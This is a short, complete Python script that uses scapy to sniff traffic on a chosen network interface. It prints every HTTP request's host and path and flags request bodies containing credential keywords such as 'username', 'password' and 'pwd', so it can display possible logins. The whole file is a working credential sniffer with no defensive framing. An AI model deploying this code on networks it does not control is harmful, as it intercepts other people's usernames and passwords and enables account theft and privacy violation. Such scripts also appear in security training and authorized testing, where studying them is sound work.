import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets.")
    arguments = parser.parse_args()
    return arguments.interface

def process_packet(packet):
    #print(packet.show())  # Print the entire packet for debugging
    
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode('utf-8')
        path = packet[http.HTTPRequest].Path.decode('utf-8')
        print("[+] Http Request >> " + host + path)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode('utf-8',errors="replace")
            keys = ["username", "password", "pass", "email","user","pwd","log"]
            
            for key in keys:
                if key in load:
                    print("[+] Possible password/username >> " + load)
                    break


def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

if __name__ == "__main__":
    interface = get_interface()
    sniff(interface)
